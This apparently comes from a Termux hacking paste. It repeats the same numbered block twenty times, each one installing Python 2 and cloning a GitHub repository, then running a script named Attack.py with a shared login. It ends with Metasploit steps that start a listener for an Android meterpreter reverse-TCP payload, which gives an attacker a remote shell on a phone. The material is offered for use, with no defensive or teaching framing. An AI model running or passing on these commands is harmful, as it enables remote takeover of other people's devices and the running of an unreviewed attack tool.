
⭕No 1
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

⭕No 2
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 3
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 4
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 5
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 6
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 7
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 8
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 9
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

⭕No 10
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 11
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 12
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 13
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 14
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 15
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 16
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

⭕No 17
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI
⭕No 18
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

⭕No 19
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

⭕No 20
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
pip2 install requests
pip2 install mechanize
git clone https://github.com/XIDIXP/World
cd World
python2 Attack.py

User Name : XIDI
Password   : XIDI

#Metasploit Commands
》》Requirements:-

1: Termux App (From Playstore)
2: Good Internet connection  (Must)
3: 2GB free Storage  (Must)
4: Android Version 5.0+ (Must)
5: 4GB+ RAM
6: Fast Processor

#installation

1: pkg update
2: pkg upgrade
3: pkg install unstable-repo
4: pkg install metasploit
5: msfconsole
6: use exploit/multi/handler
7: set payload android/meterpreter/reverse_tcp 
8: set lhost 
8: set lport 8080
10: exploit
